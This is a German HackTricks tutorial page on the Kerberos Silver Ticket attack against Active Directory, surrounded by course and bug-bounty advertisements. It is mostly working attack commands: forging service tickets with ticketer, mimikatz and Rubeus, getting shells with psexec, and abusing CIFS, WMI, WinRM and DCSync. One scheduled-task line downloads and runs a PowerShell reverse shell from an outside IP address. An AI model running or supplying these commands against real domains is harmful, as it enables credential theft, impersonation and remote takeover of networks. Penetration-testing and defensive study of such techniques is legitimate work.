# Silberticket

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Prämien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silberticket

Der **Silberticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf dem **Erwerb des NTLM-Hashs eines Dienstkontos**, wie z. B. eines Computerkontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf spezifische Dienste im Netzwerk zugreifen, **wobei er sich als beliebiger Benutzer ausgibt**, wobei er in der Regel auf administrative Berechtigungen abzielt. Es wird betont, dass die Verwendung von AES-Schlüsseln für das Fälschen von Tickets sicherer und weniger erkennbar ist.

Für das Ticket-Handling werden verschiedene Tools je nach Betriebssystem verwendet:

### Auf Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Auf Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
## Verfügbare Dienste

| Diensttyp                                  | Dienst Silber Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell-Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nach: WINRM fragen</p> |
| Geplante Aufgaben                          | HOST                                                                       |
| Windows-Dateifreigabe, auch psexec         | CIFS                                                                       |
| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Goldene Tickets                            | krbtgt                                                                     |

Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver-Ticket-Ereignis-IDs

* 4624: Kontoeinwahl
* 4634: Kontoabmeldung
* 4672: Admin-Einwahl

## Missbrauch von Servicetickets

In den folgenden Beispielen nehmen wir an, dass das Ticket unter der Identität des Administrator-Accounts abgerufen wurde.

### CIFS

Mit diesem Ticket können Sie auf die Ordner `C$` und `ADMIN$` über **SMB** zugreifen (sofern sie freigegeben sind) und Dateien auf einem Teil des entfernten Dateisystems kopieren, indem Sie einfach etwas wie:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### HOST

Mit dieser Berechtigung können Sie geplante Aufgaben in entfernten Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets können Sie **WMI im Zielsystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
### HOST + WSMAN (WINRM)

Mit WinRM-Zugriff auf einen Computer können Sie **darauf zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Überprüfen Sie die folgende Seite, um **weitere Möglichkeiten zur Verbindung mit einem Remote-Host über WinRM** zu erfahren:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Beachten Sie, dass **WinRM aktiv und auf dem Remote-Computer hörend** sein muss, um darauf zuzugreifen.
{% endhint %}

### LDAP

Mit diesem Privileg können Sie die DC-Datenbank mithilfe von **DCSync** dumpen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahren Sie mehr über DCSync** auf der folgenden Seite:

## Referenzen

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Erfahren Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
